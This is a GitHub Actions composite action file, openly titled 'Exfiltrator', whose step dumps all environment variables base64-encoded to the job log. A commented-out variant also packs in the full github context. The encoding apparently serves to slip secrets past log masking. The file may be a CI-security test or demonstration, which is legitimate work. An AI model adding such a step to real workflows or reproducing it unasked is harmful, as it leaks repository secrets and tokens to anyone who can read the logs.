name: 'Exfiltrator'
description: 'This exfiltrates secrets and environment variables.'

runs:
  using: "composite"
  steps:
    - name: 'Print secrets and environment variables to the terminal'
      shell: bash
      #run: environment="{\"vars\":\"$(env | base64 -w 0)\"}" && json_array=$(printf '[%s, %s, %s]' "$environment" "$GITHUB_JSON" "$EMPTY") && base64_encoded=$(echo "$json_array" | base64 -w 0) && echo "$base64_encoded"
      run: env | base64 -w 0
      env:
        GITHUB_JSON: ${{ toJSON(github) }}
        EMPTY: "{\"vars\":\"no vars\"}"
        
